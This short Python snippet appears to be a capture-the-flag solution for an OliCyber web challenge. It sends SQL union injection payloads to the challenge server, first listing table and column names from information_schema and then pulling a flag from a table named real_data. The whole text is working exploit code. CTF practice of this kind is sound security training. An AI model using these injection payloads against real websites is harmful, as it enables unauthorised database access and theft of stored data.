...
inj = Inj('http://web-17.challs.olicyber.it')
response, error = inj.union("1' union select table_name,column_name,3,4,5,6 from information_schema.columns where table_schema=database() -- ")
print(response)
inj = Inj('http://web-17.challs.olicyber.it')
response, error = inj.union("1' union select flag,2,3,4,5,6 from real_data -- ")
print(response)
